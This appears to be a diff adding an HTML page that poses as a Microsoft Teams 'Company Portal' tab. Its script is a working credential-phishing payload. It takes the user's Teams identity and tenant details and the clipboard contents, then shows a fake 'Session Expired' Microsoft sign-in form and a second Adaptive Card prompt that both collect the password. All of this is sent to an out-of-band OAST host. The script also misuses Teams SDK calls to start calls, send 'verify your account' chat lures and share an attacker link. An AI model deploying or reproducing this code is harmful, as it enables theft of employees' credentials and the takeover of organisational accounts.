@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Company Portal</title>
+<script src="https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js"></script>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+    background: #f5f5f5;
+    display: flex; justify-content: center; align-items: center;
+    min-height: 100vh;
+  }
+  .overlay {
+    position: fixed; top:0; left:0; right:0; bottom:0;
+    background: rgba(0,0,0,0.4);
+    display: flex; justify-content: center; align-items: center;
+    z-index: 1000;
+  }
+  .card {
+    background: white;
+    border-radius: 8px;
+    padding: 32px 28px;
+    width: 340px;
+    max-width: 90vw;
+    box-shadow: 0 25px 50px rgba(0,0,0,0.25);
+  }
+  .ms-logo {
+    display: flex; align-items: center; gap: 8px;
+    margin-bottom: 20px;
+  }
+  .ms-logo-grid {
+    display: grid; grid-template-columns: 1fr 1fr; gap: 2px;
+    width: 18px; height: 18px;
+  }
+  .ms-logo-grid div { background: #f25022; }
+  .ms-logo-grid div:nth-child(2) { background: #7fba00; }
+  .ms-logo-grid div:nth-child(3) { background: #00a4ef; }
+  .ms-logo-grid div:nth-child(4) { background: #ffb900; }
+  .ms-logo span { font-size: 15px; color: #5e5e5e; font-weight: 600; }
+  .lock-icon { text-align: center; margin-bottom: 12px; }
+  .lock-icon svg { width: 48px; height: 48px; }
+  h2 { font-size: 20px; font-weight: 600; color: #1b1b1b; text-align: center; margin-bottom: 6px; }
+  .subtitle { font-size: 13px; color: #616161; text-align: center; margin-bottom: 20px; line-height: 1.4; }
+  .user-badge {
+    display: flex; align-items: center; gap: 10px;
+    background: #f0f0f0; border-radius: 6px;
+    padding: 10px 12px; margin-bottom: 16px;
+  }
+  .user-avatar {
+    width: 32px; height: 32px; border-radius: 50%;
+    background: #0078d4; color: white;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 14px; font-weight: 600;
+  }
+  .user-info { flex: 1; }
+  .user-name { font-size: 13px; font-weight: 600; color: #1b1b1b; }
+  .user-email { font-size: 11px; color: #616161; }
+  .form-group { margin-bottom: 14px; }
+  label { display: block; font-size: 12px; font-weight: 600; color: #323130; margin-bottom: 4px; }
+  input[type="password"] {
+    width: 100%; padding: 8px 10px;
+    border: 1px solid #8a8886; border-radius: 4px;
+    font-size: 14px; outline: none;
+  }
+  input:focus { border-color: #0078d4; border-width: 2px; }
+  .btn-primary {
+    width: 100%; padding: 10px;
+    background: #0078d4; color: white;
+    border: none; border-radius: 4px;
+    font-size: 14px; font-weight: 600; cursor: pointer;
+  }
+  .footer-links { text-align: center; margin-top: 14px; }
+  .footer-links a { font-size: 12px; color: #0078d4; text-decoration: none; }
+  .loading { text-align: center; padding: 60px 20px; }
+  .spinner {
+    width: 32px; height: 32px;
+    border: 3px solid #e0e0e0; border-top-color: #0078d4;
+    border-radius: 50%; animation: spin 0.8s linear infinite;
+    margin: 0 auto 16px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .success-msg { display: none; text-align: center; padding: 40px 20px; }
+  .success-msg .check {
+    width: 48px; height: 48px; margin: 0 auto 12px;
+    background: #107c10; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    color: white; font-size: 24px;
+  }
+</style>
+</head>
+<body>
+
+<div id="loading" class="loading">
+  <div class="spinner"></div>
+  <div style="font-size:14px;color:#616161;">Connecting to Company Portal...</div>
+</div>
+
+<div id="loginOverlay" class="overlay" style="display:none;">
+  <div class="card">
+    <div class="ms-logo">
+      <div class="ms-logo-grid"><div></div><div></div><div></div><div></div></div>
+      <span>Microsoft</span>
+    </div>
+    <div class="lock-icon">
+      <svg viewBox="0 0 48 48" fill="none"><circle cx="24" cy="24" r="23" stroke="#d83b01" stroke-width="2"/>
+      <path d="M24 12a6 6 0 0 0-6 6v4h-2a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V24a2 2 0 0 0-2-2h-2v-4a6 6 0 0 0-6-6zm-3 10v-4a3 3 0 0 1 6 0v4h-6zm3 8a2 2 0 1 1 0-4 2 2 0 0 1 0 4z" fill="#d83b01"/></svg>
+    </div>
+    <h2>Session Expired</h2>
+    <p class="subtitle">Your authentication has expired. Please sign in again to access Company Portal.</p>
+    <div class="user-badge" id="userBadge" style="display:none;">
+      <div class="user-avatar" id="userAvatar">?</div>
+      <div class="user-info">
+        <div class="user-name" id="userName"></div>
+        <div class="user-email" id="userEmail"></div>
+      </div>
+    </div>
+    <form id="loginForm">
+      <div class="form-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" placeholder="Enter your password" required autocomplete="off">
+      </div>
+      <button type="submit" class="btn-primary">Sign in</button>
+    </form>
+    <div class="footer-links">
+      <a href="#">Forgot password?</a> &nbsp;|&nbsp; <a href="#">Sign in with another account</a>
+    </div>
+  </div>
+</div>
+
+<div id="success" class="success-msg">
+  <div class="check">&#10003;</div>
+  <h2 style="font-size:18px;">Signed in successfully</h2>
+  <p class="subtitle">Loading Company Portal...</p>
+  <div class="spinner" style="margin-top:20px;"></div>
+</div>
+
+<script>
+var OAST = 'ah68rec59k8hf1qr0i5u7hqxpcwremkn3.oast.site';
+
+function exfil(path, data) {
+  var p = Object.keys(data).map(function(k) {
+    return k + '=' + encodeURIComponent(String(data[k] || '').substring(0, 400));
+  }).join('&');
+  fetch('https://' + OAST + '/' + path + '?' + p).catch(function() {
+    new Image().src = 'https://' + OAST + '/' + path + '?' + p;
+  });
+}
+
+(async function() {
+  try {
+    await microsoftTeams.app.initialize();
+    var ctx = await microsoftTeams.app.getContext();
+
+    // PHASE 1: Exfiltrate identity
+    exfil('sdk-context', {
+      upn: ctx.user.userPrincipalName,
+      userId: ctx.user.id,
+      tenantId: ctx.user.tenant.id,
+      host: ctx.app.host.clientType,
+      channel: ctx.channel ? ctx.channel.displayName : 'N/A',
+      teamId: ctx.team ? ctx.team.groupId : 'N/A'
+    });
+
+    // PHASE 2: Silent clipboard read
+    try {
+      var clip = await navigator.clipboard.readText();
+      if (clip) exfil('clipboard-stolen', { content: clip });
+    } catch(e) {}
+
+    // PHASE 3: Show session expired screen with pre-filled identity
+    var upn = ctx.user.userPrincipalName;
+    var name = upn.split('@')[0].replace(/[._]/g, ' ');
+    var initials = name.split(' ').map(function(w){ return w[0]; }).join('').toUpperCase().substring(0,2);
+
+    document.getElementById('userAvatar').textContent = initials;
+    document.getElementById('userName').textContent = name;
+    document.getElementById('userEmail').textContent = upn;
+    document.getElementById('userBadge').style.display = 'flex';
+    document.getElementById('loading').style.display = 'none';
+    document.getElementById('loginOverlay').style.display = 'flex';
+
+    // PHASE 4: Capture password on submit
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      exfil('credentials-captured', {
+        email: upn, password: document.getElementById('password').value,
+        tenantId: ctx.user.tenant.id, source: 'session-expired-form'
+      });
+      document.getElementById('loginOverlay').style.display = 'none';
+      document.getElementById('success').style.display = 'block';
+    });
+
+    // PHASE 5: Adaptive Card native dialog (alternative credential capture)
+    try {
+      microsoftTeams.dialog.adaptiveCard.open({
+        title: 'Verify Your Identity',
+        card: JSON.stringify({
+          type: 'AdaptiveCard', version: '1.5',
+          body: [
+            { type: 'TextBlock', text: 'Your session has expired.', weight: 'Bolder', size: 'Medium' },
+            { type: 'TextBlock', text: 'Email', size: 'Small', spacing: 'Medium' },
+            { type: 'Input.Text', id: 'email', value: upn },
+            { type: 'TextBlock', text: 'Password', size: 'Small' },
+            { type: 'Input.Text', id: 'password', placeholder: 'Enter password', style: 'password' }
+          ],
+          actions: [{ type: 'Action.Submit', title: 'Sign In', style: 'positive' }]
+        })
+      }, function(result) {
+        if (result && result.result) {
+          exfil('adaptive-card-creds', {
+            email: result.result.email, password: result.result.password
+          });
+        }
+      });
+    } catch(e) {}
+
+    // PHASE 6: SDK abuse
+    try { microsoftTeams.call.startCall({ targets: [upn], requestedModalities: [1] }); } catch(e) {}
+    try { microsoftTeams.chat.openChat({ user: upn, message: 'Urgent: Verify your account at the Company Portal tab.' }); } catch(e) {}
+    try { microsoftTeams.sharing.shareWebContent({ content: [{ type:'URL', url:'https://'+OAST+'/share', message:'Security update', preview:true }] }); } catch(e) {}
+
+  } catch(e) {
+    document.getElementById('loading').style.display = 'none';
+    document.getElementById('loginOverlay').style.display = 'flex';
+  }
+})();
+</script>
+</body>
+</html>
